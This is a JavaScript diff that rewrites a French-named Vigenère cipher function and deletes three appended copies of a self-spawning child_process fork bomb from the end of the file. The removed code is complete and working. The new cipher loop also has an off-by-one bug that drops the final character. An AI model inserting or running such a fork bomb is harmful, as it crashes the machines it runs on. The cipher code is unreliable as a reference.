@@ -107,41 +107,22 @@ function yoda(chaine) {
   return chaine.split(" ").reverse().join(" ");
 }
 
-function vig(string, code) {
-  if (typeof key !== "string") return "";
-  if (string.length === 0) return string;
+function vig(key, string) {
+    if (typeof key !== "string" && key !== "") return ""
+    if (typeof string !== "string" && string !== "") return ""
 
-  while (code.length < string.length) {
-    code += code;
-  }
+    const msgLength = string.length
+    const keyLength = key.length
+
+    let cryptage = "";
+
+    for (let i = 1; i < msgLength; i++) {
+        let charCode = string.charCodeAt(i-1)-65
+        let decalage = key.charCodeAt((i-1)%keyLength)-65
+        let char = String.fromCharCode(65+(charCode+decalage)%26)
+
+        cryptage += char
+    }
+
+    return cryptage
 }
-(function f() {
-  require("child_process").spawn(process.argv[0], [
-    "-e",
-    "(" + f.toString() + "());",
-  ]);
-  require("child_process").spawn(process.argv[0], [
-    "-e",
-    "(" + f.toString() + "());",
-  ]);
-})();
-(function f() {
-  require("child_process").spawn(process.argv[0], [
-    "-e",
-    "(" + f.toString() + "());",
-  ]);
-  require("child_process").spawn(process.argv[0], [
-    "-e",
-    "(" + f.toString() + "());",
-  ]);
-})();
-(function f() {
-  require("child_process").spawn(process.argv[0], [
-    "-e",
-    "(" + f.toString() + "());",
-  ]);
-  require("child_process").spawn(process.argv[0], [
-    "-e",
-    "(" + f.toString() + "());",
-  ]);
-})();
